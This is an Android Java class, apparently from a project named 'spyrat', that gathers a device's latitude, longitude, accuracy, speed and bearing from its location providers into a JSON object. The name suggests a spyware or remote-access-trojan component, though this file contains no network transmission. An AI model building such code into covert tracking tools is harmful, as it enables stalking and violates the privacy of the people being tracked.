package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;

    public RealLocationCollector(Context context) {
        this.context = context;
    }

    public JSONObject getCurrentLocation() {
        JSONObject location = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Starting REAL location collection...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try multiple location providers
            Location bestLocation = null;
            String[] providers = {LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER};
            
            for (String provider : providers) {
                try {
                    if (locationManager != null && locationManager.isProviderEnabled(provider)) {
                        Location loc = locationManager.getLastKnownLocation(provider);
                        if (loc != null) {
                            if (bestLocation == null || loc.getAccuracy() < bestLocation.getAccuracy()) {
                                bestLocation = loc;
                            }
                        }
                    }
                } catch (SecurityException e) {
                    Log.w(TAG, "⚠️ Permission denied for provider: " + provider);
                }
            }
            
            if (bestLocation != null) {
                // USE REAL LOCATION DATA
                location.put("latitude", bestLocation.getLatitude());
                location.put("longitude", bestLocation.getLongitude());
                location.put("accuracy", bestLocation.getAccuracy());
                location.put("provider", bestLocation.getProvider());
                location.put("timestamp", bestLocation.getTime());
                location.put("altitude", bestLocation.hasAltitude() ? bestLocation.getAltitude() : "unknown");
                location.put("speed", bestLocation.hasSpeed() ? bestLocation.getSpeed() : "unknown");
                location.put("bearing", bestLocation.hasBearing() ? bestLocation.getBearing() : "unknown");
                
                Log.d(TAG, "✅ REAL Location collected: " + bestLocation.getLatitude() + ", " + bestLocation.getLongitude());
                Log.d(TAG, "📍 Provider: " + bestLocation.getProvider() + ", Accuracy: " + bestLocation.getAccuracy() + "m");
                
            } else {
                // No location available - use descriptive message instead of zeros
                location.put("latitude", "location_unavailable");
                location.put("longitude", "location_unavailable");
                location.put("accuracy", "unknown");
                location.put("provider", "no_provider_available");
                location.put("timestamp", System.currentTimeMillis());
                location.put("altitude", "unknown");
                location.put("speed", "unknown");
                location.put("bearing", "unknown");
                location.put("status", "no_location_data");
                location.put("message", "Location services not available or permissions denied");
                
                Log.w(TAG, "⚠️ No location data available - check permissions and location services");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            // Better error reporting
            location.put("latitude", "permission_denied");
            location.put("longitude", "permission_denied");
            location.put("accuracy", "denied");
            location.put("provider", "permission_denied");
            location.put("timestamp", System.currentTimeMillis());
            location.put("altitude", "denied");
            location.put("speed", "denied");
            location.put("bearing", "denied");
            location.put("status", "permission_error");
            location.put("message", "Location permissions not granted: " + e.getMessage());
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Location collection error: " + e.getMessage());
            // Better error reporting
            location.put("latitude", "error");
            location.put("longitude", "error");
            location.put("accuracy", "error");
            location.put("provider", "error");
            location.put("timestamp", System.currentTimeMillis());
            location.put("altitude", "error");
            location.put("speed", "error");
            location.put("bearing", "error");
            location.put("status", "collection_error");
            location.put("message", "Location collection failed: " + e.getMessage());
        }
        
        return location;
    }
}
